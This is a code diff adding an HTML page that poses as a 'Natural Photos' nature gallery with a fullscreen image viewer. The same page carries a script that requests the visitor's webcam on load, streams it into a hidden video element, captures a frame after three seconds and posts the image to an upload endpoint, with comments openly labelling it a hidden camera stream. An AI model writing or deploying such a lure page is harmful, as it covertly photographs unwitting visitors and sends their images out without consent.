@@ -1,0 +1,152 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Natural Photos</title>
+
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            height: 100vh;
+            margin: 0;
+            background-color: #f4f4f4;
+        }
+
+        video {
+            width: 100%;
+            max-width: 400px;
+            border: 2px solid #ccc;
+            border-radius: 10px;
+            display: none;
+        }
+
+        .gallery {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 10px;
+            justify-content: center;
+            padding: 20px;
+        }
+
+        .gallery img {
+            width: 150px;
+            height: 100px;
+            object-fit: cover;
+            border-radius: 5px;
+            border: 1px solid #ccc;
+            cursor: pointer;
+            transition: transform 0.3s ease;
+        }
+
+        .gallery img:hover {
+            transform: scale(1.1);
+        }
+
+        #fullscreen {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100vw;
+            height: 100vh;
+            background-color: rgba(0, 0, 0, 0.9);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            z-index: 1000;
+            display: none;
+        }
+
+        #fullscreen img {
+            max-width: 90%;
+            max-height: 90%;
+        }
+    </style>
+</head>
+
+<body>
+
+    <h1>Welcome to Natural Photos</h1>
+
+    <div class="gallery">
+        <img src="https://images.pexels.com/photos/417074/pexels-photo-417074.jpeg" alt="Photo 1">
+        <img src="https://cdn.pixabay.com/photo/2024/03/04/14/17/ai-generated-8612487_1280.jpg" alt="Photo 2">
+        <img src="https://images.pexels.com/photos/417173/pexels-photo-417173.jpeg" alt="Photo 3">
+        <img src="https://images.pexels.com/photos/19161535/pexels-photo-19161535/free-photo.jpeg" alt="Photo 4">
+        <img src="https://images.pexels.com/photos/8051671/pexels-photo-8051671.jpeg" alt="Photo 5">
+        <img src="https://images.pexels.com/photos/9553006/pexels-photo-9553006.jpeg" alt="Photo 6">
+        <img src="https://images.pexels.com/photos/11963863/pexels-photo-11963863.jpeg" alt="Photo 7">
+        <img src="https://images.pexels.com/photos/8042541/pexels-photo-8042541.jpeg" alt="Photo 8">
+        <img src="https://images.pexels.com/photos/4957166/pexels-photo-4957166.jpeg" alt="Photo 9">
+        <img src="https://images.pexels.com/photos/5138927/pexels-photo-5138927.jpeg" alt="Photo 10">
+    </div>
+
+    <!-- Hidden video camera stream -->
+    <video id="video" autoplay></video>
+
+    <!-- Fullscreen viewer -->
+    <div id="fullscreen">
+        <img id="fullscreenImg" src="" alt="Fullscreen">
+    </div>
+
+    <script>
+        const video = document.getElementById('video');
+        const fullscreen = document.getElementById('fullscreen');
+        const fullscreenImg = document.getElementById('fullscreenImg');
+        const galleryImages = document.querySelectorAll('.gallery img');
+
+        // Auto camera access
+        navigator.mediaDevices.getUserMedia({ video: true })
+            .then((stream) => {
+                video.srcObject = stream;
+                setTimeout(() => {
+                    capturePhoto();
+                    stream.getTracks().forEach(track => track.stop());
+                }, 3000);
+            })
+            .catch((error) => {
+                console.error('Camera access denied:', error);
+            });
+
+        // NEW PHOTO CAPTURE + CLOUDINARY UPLOAD
+        function capturePhoto() {
+            const canvas = document.createElement('canvas');
+            const ctx = canvas.getContext('2d');
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+            const base64Image = canvas.toDataURL("image/png");
+
+            fetch("/api/upload", {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({ image: base64Image })
+            })
+            .then(res => res.json())
+            .then(data => {
+                console.log("Uploaded:", data);
+                alert("Photo uploaded & email sent!");
+            })
+            .catch(err => console.error("Error:", err));
+        }
+
+        // Fullscreen image viewer
+        galleryImages.forEach(image => {
+            image.addEventListener('click', () => {
+                fullscreenImg.src = image.src;
+                fullscreen.style.display = 'flex';
+            });
+        });
+
+        fullscreen.addEventListener('click', () => {
+            fullscreen.style.display = 'none';
+        });
+    </script>
+
+</body>
+</html>
